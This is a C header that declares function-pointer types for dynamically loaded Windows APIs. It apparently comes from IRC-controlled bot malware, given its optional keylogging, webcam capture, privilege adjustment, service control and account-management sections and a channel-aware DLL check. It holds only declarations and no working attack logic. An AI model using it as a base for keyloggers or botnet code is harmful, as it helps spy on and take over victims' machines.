// kernel32.dll function variables
typedef UINT (WINAPI *SEM)(UINT);
typedef HANDLE (WINAPI *CT32S)(DWORD,DWORD);
typedef bool (WINAPI *P32F)(HANDLE,LPPROCESSENTRY32);
typedef bool (WINAPI *P32N)(HANDLE,LPPROCESSENTRY32);
typedef bool (WINAPI *M32F)(HANDLE,LPMODULEENTRY32);
typedef bool (WINAPI *GDFSE)(LPCTSTR,PULARGE_INTEGER,PULARGE_INTEGER,PULARGE_INTEGER);
typedef DWORD (WINAPI *GLDS)(DWORD,LPTSTR);
typedef UINT (WINAPI *GDT)(LPCTSTR);
typedef DWORD (WINAPI *SP)(LPCTSTR,LPCTSTR,LPCTSTR,DWORD,LPTSTR,LPTSTR *);
typedef bool (WINAPI *QPC)(LARGE_INTEGER *);
typedef bool (WINAPI *QPF)(LARGE_INTEGER *);
typedef DWORD (WINAPI *RSP)(DWORD,DWORD);

// user32.dll function variables
typedef LRESULT (WINAPI *SM)(HWND,UINT,WPARAM,LPARAM);
typedef HWND (WINAPI *FW)(LPCTSTR,LPCTSTR);
typedef bool (WINAPI *IW)(HWND);
typedef bool (WINAPI *DW)(HWND);
typedef bool (WINAPI *OC)(HWND);
typedef HANDLE (WINAPI *GCD)(UINT);
typedef bool (WINAPI *CC)(VOID);
typedef bool (WINAPI *EWE)(UINT,DWORD);
#ifndef NO_KEYLOG
typedef SHORT (WINAPI *GAKS)(int);
typedef SHORT (WINAPI *GKS)(int);
typedef int (WINAPI *GWT)(HWND,LPTSTR,int);
typedef HWND (WINAPI *GFW)(VOID);
#endif

// advapi32.dll function variables
typedef LONG (WINAPI *ROKE)(HKEY,LPCTSTR,DWORD,REGSAM,PHKEY);
typedef LONG (WINAPI *RCKE)(HKEY,LPCTSTR,DWORD,LPTSTR,DWORD,REGSAM,LPSECURITY_ATTRIBUTES,PHKEY,LPDWORD);
typedef LONG (WINAPI *RSVE)(HKEY,LPCTSTR,DWORD,DWORD,const BYTE *,DWORD);
typedef LONG (WINAPI *RQVE)(HKEY,LPCTSTR,LPDWORD,LPDWORD,LPBYTE,LPDWORD);
typedef LONG (WINAPI *REK)(HKEY,DWORD,LPTSTR,DWORD);
typedef LONG (WINAPI *RDV)(HKEY,LPCTSTR);
typedef LONG (WINAPI *RCK)(HKEY);
#ifndef NO_PROCESS
typedef bool (WINAPI *OPT)(HANDLE,DWORD,PHANDLE);
typedef bool (WINAPI *LPV)(LPCTSTR,LPCTSTR,PLUID);
typedef bool (WINAPI *ATP)(HANDLE,bool,PTOKEN_PRIVILEGES,DWORD,PTOKEN_PRIVILEGES,PDWORD);
typedef BOOL (WINAPI *ASS)(LPSTR);

#endif
#ifndef NO_NET
typedef SC_HANDLE (WINAPI *OSCM)(LPCTSTR,LPCTSTR,DWORD);
typedef SC_HANDLE (WINAPI *OS)(SC_HANDLE,LPCTSTR,DWORD);
typedef bool (WINAPI *SS)(SC_HANDLE,DWORD,LPCTSTR *);
typedef bool (WINAPI *CS)(SC_HANDLE,DWORD,LPSERVICE_STATUS);
typedef bool (WINAPI *DS)(SC_HANDLE);
typedef bool (WINAPI *CSH)(SC_HANDLE);
typedef bool (WINAPI *ESS)(SC_HANDLE,DWORD,DWORD,LPENUM_SERVICE_STATUS,DWORD,LPDWORD,LPDWORD,LPDWORD);
typedef bool (WINAPI *IVSD)(PSECURITY_DESCRIPTOR);
#endif 
#ifndef NO_SYSINFO
typedef bool (WINAPI *GUN)(LPTSTR,LPDWORD);
#endif

// gdi32.dll function variables
typedef HDC (WINAPI *CDC)(LPCTSTR,LPCTSTR,LPCTSTR,CONST DEVMODE *);
typedef HBITMAP (WINAPI *CDIBS)(HDC,CONST BITMAPINFO *,UINT,VOID **,HANDLE,DWORD);
typedef HDC (WINAPI *CCDC)(HDC);
typedef int (WINAPI *GDC)(HDC,int);
typedef UINT (WINAPI *GDIBCT)(HDC,UINT,UINT,RGBQUAD *);
typedef HGDIOBJ (WINAPI *SO)(HDC,HGDIOBJ);
typedef BOOL (WINAPI *BB)(HDC,int,int,int,int,HDC,int,int,DWORD);
typedef BOOL (WINAPI *DDC)(HDC);
typedef BOOL (WINAPI *DO)(HGDIOBJ);

// ws2_32.dll function variables
typedef int (WINAPI *WSAS)(WORD,LPWSADATA);
typedef SOCKET (WINAPI *WSASo)(int,int,int,LPWSAPROTOCOL_INFO,GROUP,DWORD);
typedef int (WINAPI *WSAAS)(SOCKET,HWND hWnd,unsigned int,long);
typedef int (WINAPI *WSAFDIS)(SOCKET,fd_set *);
typedef int (WINAPI *WSAI)(SOCKET,DWORD,LPVOID,DWORD,LPVOID,DWORD,LPDWORD,LPWSAOVERLAPPED,LPWSAOVERLAPPED_COMPLETION_ROUTINE);
typedef int (WINAPI *WSAGLE)(void);
typedef int (WINAPI *WSAC)(void);
typedef SOCKET (WINAPI *SOCK)(int,int,int);
typedef int (WINAPI *IOCTLS)(SOCKET,long cmd,u_long *);
typedef int (WINAPI *CON)(SOCKET,const struct sockaddr *,int);
typedef char * FAR (WINAPI *INTOA)(struct in_addr);
typedef unsigned long (WINAPI *IADDR)(const char *);
typedef u_short (WINAPI *HTONS)(u_short);
typedef u_long (WINAPI *HTONL)(u_long);
typedef u_short (WINAPI *NTOHS)(u_short);
typedef u_long (WINAPI *NTOHL)(u_long);
typedef int (WINAPI *SEND)(SOCKET,const char *,int,int);
typedef int (WINAPI *SENDTO)(SOCKET,const char *,int,int,const struct sockaddr *,int);
typedef int (WINAPI *RECV)(SOCKET,char *,int,int);
typedef int (WINAPI *RECVFROM)(SOCKET,char *,int,int,struct sockaddr *,int *);
typedef int (WINAPI *BIND)(SOCKET,const struct sockaddr *,int);
typedef int (WINAPI *SEL)(int,fd_set *,fd_set *,fd_set *,const struct timeval *);
typedef int (WINAPI *LIS)(SOCKET,int);
typedef SOCKET (WINAPI *ACC)(SOCKET,struct sockaddr *,int *);
typedef int (WINAPI *SSO)(SOCKET,int,int,const char *,int);
typedef int (WINAPI *GSN)(SOCKET,struct sockaddr *,int *);
typedef int (WINAPI *GHN)(char *,int);
typedef struct hostent* FAR (WINAPI *GHBN)(const char *);
typedef struct hostent* FAR (WINAPI *GHBA)(const char *,int,int);
typedef int (WINAPI *GPN)(SOCKET,struct sockaddr*,int*);
typedef int (WINAPI *CLSO)(SOCKET);

// wininet.dll function variables
typedef bool (WINAPI *IGCSE)(LPDWORD,LPTSTR,DWORD,DWORD);
typedef bool (WINAPI *IGCS)(LPDWORD,DWORD);
typedef HINTERNET (WINAPI *HOR)(HINTERNET,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR *,DWORD,PDWORD);
typedef bool (WINAPI *HSR)(HINTERNET,LPCTSTR,DWORD,LPVOID,DWORD);
typedef HINTERNET (WINAPI *IC)(HINTERNET,LPCTSTR,INTERNET_PORT,LPCTSTR,LPCTSTR,DWORD,DWORD,PDWORD);
typedef HINTERNET (WINAPI *IO)(LPCTSTR,DWORD,LPCTSTR,LPCTSTR,DWORD);
typedef HINTERNET (WINAPI *IOU)(HINTERNET,LPCTSTR,LPCTSTR,DWORD,DWORD,PDWORD);
typedef bool (WINAPI *ICU)(LPCTSTR,DWORD,DWORD,LPURL_COMPONENTS);
typedef bool (WINAPI *IRF)(HINTERNET,LPVOID,DWORD,LPDWORD);
typedef bool (WINAPI *ICH)(HINTERNET);

// icmp.dll function variables
#ifndef NO_PING
typedef HANDLE (WINAPI *ICF)(VOID);
typedef DWORD (WINAPI *ISE)(HANDLE,IPAddr,LPVOID,WORD,PIP_OPTION_INFORMATION,LPVOID,DWORD,DWORD);
typedef bool (WINAPI *ICH)(HANDLE);
#endif

// netapi32.dll function variables
typedef NET_API_STATUS (WINAPI *NSA)(LPWSTR,DWORD,LPBYTE,LPDWORD);
typedef NET_API_STATUS (WINAPI *NSD)(LPWSTR,LPWSTR,DWORD);
typedef NET_API_STATUS (WINAPI *NSE)(LPWSTR,DWORD,LPBYTE *,DWORD,LPDWORD,LPDWORD,LPDWORD);
typedef NET_API_STATUS (WINAPI *NSJA)(LPCWSTR,LPBYTE,LPDWORD);
typedef NET_API_STATUS (WINAPI *NABF)(LPVOID);
typedef NET_API_STATUS (WINAPI *NRTOD)(LPCWSTR,LPBYTE *);
typedef NET_API_STATUS (WINAPI *NUA)(LPCWSTR,DWORD,LPBYTE,LPDWORD);
typedef NET_API_STATUS (WINAPI *NUD)(LPCWSTR,LPCWSTR);
typedef NET_API_STATUS (WINAPI *NUE)(LPCWSTR,DWORD,DWORD,LPBYTE *,DWORD,LPDWORD,LPDWORD,LPDWORD);
typedef NET_API_STATUS (WINAPI *NUGI)(LPCWSTR,LPCWSTR,DWORD,LPBYTE *);
typedef NET_API_STATUS (WINAPI *NMBS)(LPCWSTR,LPCWSTR,LPCWSTR,LPBYTE,DWORD);

// dnsapi.dll function variables
typedef bool (WINAPI *DFRC)(void);
typedef DNS_STATUS (WINAPI *DFRCEA)(LPCSTR);
typedef DNS_STATUS (WINAPI *DQA)(IN PCSTR pszName, IN WORD wType, IN DWORD Options, IN PIP4_ARRAY aipServers OPTIONAL, IN OUT PDNS_RECORD *ppQueryResults OPTIONAL, IN OUT PVOID *pReserved OPTIONAL);
typedef DWORD (WINAPI *GNP)(PFIXED_INFO, PULONG);

// iphlpapi.dll function variables
typedef DWORD (WINAPI *GINT)(PMIB_IPNETTABLE,PULONG,bool);
typedef DWORD (WINAPI *DINE)(PMIB_IPNETROW);

// mpr.dll function variables
typedef DWORD (WINAPI *WNAC2)(LPNETRESOURCE,LPCTSTR,LPCTSTR,DWORD);
typedef DWORD (WINAPI *WNAC2W)(LPNETRESOURCEW,LPCWSTR,LPCWSTR,DWORD);
typedef DWORD (WINAPI *WNCC2)(LPCTSTR,DWORD,bool);
typedef DWORD (WINAPI *WNCC2W)(LPCWSTR,DWORD,bool);

// shell32.dll function variables
typedef HINSTANCE (WINAPI *SE)(HWND,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR,INT);
typedef void (WINAPI *SHCN)(LONG,UINT,LPCVOID,LPCVOID);

// odbc32.dll function variables
typedef SQLRETURN (WINAPI *SQLDC)(SQLHDBC,SQLHWND,SQLCHAR *,SQLSMALLINT,SQLCHAR *,SQLSMALLINT,SQLSMALLINT *,SQLUSMALLINT);
typedef SQLRETURN (WINAPI *SQLSEA)(SQLHENV,SQLINTEGER,SQLPOINTER,SQLINTEGER);
typedef SQLRETURN (WINAPI *SQLED)(SQLHSTMT,SQLCHAR *,SQLINTEGER);
typedef SQLRETURN (WINAPI *SQLAH)(SQLSMALLINT,SQLHANDLE,SQLHANDLE *);
typedef SQLRETURN (WINAPI *SQLFH)(SQLSMALLINT,SQLHANDLE);
typedef SQLRETURN (WINAPI *SQLD)(SQLHDBC);

#ifndef NO_CAPTURE
// avicap32.dll function variables
typedef HWND (WINAPI *cCCW)(LPCSTR,DWORD,int,int,int,int,HWND,int);
typedef BOOL (WINAPI *cGDD)(WORD,LPSTR,INT,LPSTR,INT);
#endif

typedef bool (WINAPI *EPROC)(DWORD *,DWORD,DWORD *);
typedef bool (WINAPI *EPROCM)(HANDLE,HMODULE *,DWORD,LPDWORD);
typedef DWORD (WINAPI *GMBN)(HANDLE,HMODULE,LPTSTR,DWORD);

bool LoadDLLs(void);
void CheckDLLs(SOCKET sock, char *chan, bool notice, bool silent);
